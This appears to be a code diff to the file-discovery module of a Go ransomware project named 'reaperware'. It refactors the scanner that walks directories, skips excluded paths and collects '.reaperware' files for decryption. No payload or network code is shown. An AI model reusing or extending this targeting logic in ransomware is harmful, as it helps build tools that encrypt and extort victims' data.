@@ -1,12 +1,12 @@
 package filedirectory
 
 import (
+	"context"
 	"log"
 	"os"
 	"path/filepath"
 	"runtime"
 	"strings"
-	"sync"
 )
 
 var (
@@ -45,68 +45,67 @@ type FileScanner struct {
 	RootDir          string   // Directory to start scanning
 	TargetExtensions []string // List of targeted file extensions
 	ExcludedDirs     []string // List of directories to exclude
+	MaxFileSize      int64    // 0 = no limit; skip larger files during scan
 	Results          chan string
-	wg               sync.WaitGroup
-	ScannedFiles     []string   // Store scanned file paths
-	mu               sync.Mutex // Mutex to safely append to ScannedFiles
+	ScannedFiles     []string // Store scanned file paths
 }
 
 // NewFileScanner creates a new FileScanner instance
-func NewFileScanner(rootDir string, extensions, excludedDirs []string) *FileScanner {
+func NewFileScanner(rootDir string, extensions, excludedDirs []string, maxFileSize int64) *FileScanner {
 	return &FileScanner{
 		RootDir:          rootDir,
 		TargetExtensions: extensions,
 		ExcludedDirs:     excludedDirs,
+		MaxFileSize:      maxFileSize,
 		Results:          make(chan string, 100), // Buffered channel
 	}
 }
 
 // Start initiates the file scanning process
-func (fs *FileScanner) Start() {
+func (fs *FileScanner) Start(ctx context.Context) {
 	// Launch results printer in a goroutine
 	go fs.printResults()
 
-	// Start scanning the root directory
 	log.Println("[+] Scanning for files")
-	fs.wg.Add(1)
-	go fs.scanDirectory(fs.RootDir)
+	err := filepath.WalkDir(fs.RootDir, func(path string, d os.DirEntry, walkErr error) error {
+		if err := ctx.Err(); err != nil {
+			return err
+		}
+		if walkErr != nil {
+			log.Printf("[-] Error accessing %s: %v\n", path, walkErr)
+			return nil
+		}
 
-	// Wait for all goroutines to complete
-	fs.wg.Wait()
+		if d.IsDir() && fs.isExcludedDir(path) {
+			log.Printf("[-] Skipping excluded directory: %s\n", path)
+			return filepath.SkipDir
+		}
+
+		if !d.IsDir() && fs.isTargetFile(d.Name()) {
+			info, ierr := d.Info()
+			if ierr != nil {
+				log.Printf("[-] Error stating %s: %v\n", path, ierr)
+				return nil
+			}
+			if fs.MaxFileSize > 0 && info.Size() > fs.MaxFileSize {
+				log.Printf("[-] Skipping (exceeds -max-file-size): %s size=%d max=%d\n", path, info.Size(), fs.MaxFileSize)
+				return nil
+			}
+			fs.ScannedFiles = append(fs.ScannedFiles, path)
+			fs.Results <- path
+		}
+		return nil
+	})
+	if err != nil {
+		if err == context.Canceled {
+			log.Println("[-] Scan cancelled")
+		} else {
+			log.Printf("[-] File walk failed: %v\n", err)
+		}
+	}
 
 	// Close the results channel
 	close(fs.Results)
-}
-
-// scanDirectory scans a single directory for targeted files
-func (fs *FileScanner) scanDirectory(dir string) {
-	defer fs.wg.Done()
-
-	// Skip directories in the exclusion list
-	if fs.isExcludedDir(dir) {
-		log.Printf("[-] Skipping excluded directory: %s\n", dir)
-		return
-	}
-
-	files, err := os.ReadDir(dir)
-	if err != nil {
-		log.Printf("[-] Error accessing %s: %v\n", dir, err)
-		return
-	}
-
-	for _, file := range files {
-		path := filepath.Join(dir, file.Name())
-		if file.IsDir() {
-			// Process subdirectory in a new goroutine
-			fs.wg.Add(1)
-			go fs.scanDirectory(path)
-		} else if fs.isTargetFile(file.Name()) {
-			fs.mu.Lock()
-			fs.ScannedFiles = append(fs.ScannedFiles, path)
-			fs.mu.Unlock()
-			fs.Results <- path
-		}
-	}
 }
 
 // isTargetFile checks if a file has a targeted extension
@@ -122,8 +121,18 @@ func (fs *FileScanner) isTargetFile(fileName string) bool {
 
 // isExcludedDir checks if a directory is in the exclusion list
 func (fs *FileScanner) isExcludedDir(dir string) bool {
+	normalizedDir := filepath.Clean(dir)
+	if runtime.GOOS == "windows" {
+		normalizedDir = strings.ToLower(normalizedDir)
+	}
+
 	for _, excludedDir := range fs.ExcludedDirs {
-		if strings.HasPrefix(dir, excludedDir) {
+		normalizedExcludedDir := filepath.Clean(excludedDir)
+		if runtime.GOOS == "windows" {
+			normalizedExcludedDir = strings.ToLower(normalizedExcludedDir)
+		}
+
+		if strings.HasPrefix(normalizedDir, normalizedExcludedDir) {
 			return true
 		}
 	}
@@ -179,12 +188,12 @@ func (fs *FileScanner) ToDecryptTasks() []FileTask {
 	return decryptTasks
 }
 
-func FindTheEncryptedFiles(rootDir string) []FileTask {
+func FindTheEncryptedFiles(ctx context.Context, rootDir string, maxFileSize int64) []FileTask {
 	// Initialize the FileScanner for `.reaperware` files
-	fileScanner := NewFileScanner(rootDir, EncryptedExtension, ExcludedDirs)
+	fileScanner := NewFileScanner(rootDir, EncryptedExtension, ExcludedDirs, maxFileSize)
 
 	// Start scanning
-	fileScanner.Start()
+	fileScanner.Start(ctx)
 
 	// Convert `.reaperware` files into FileTask entries for further processing
 	return fileScanner.ToDecryptTasks()
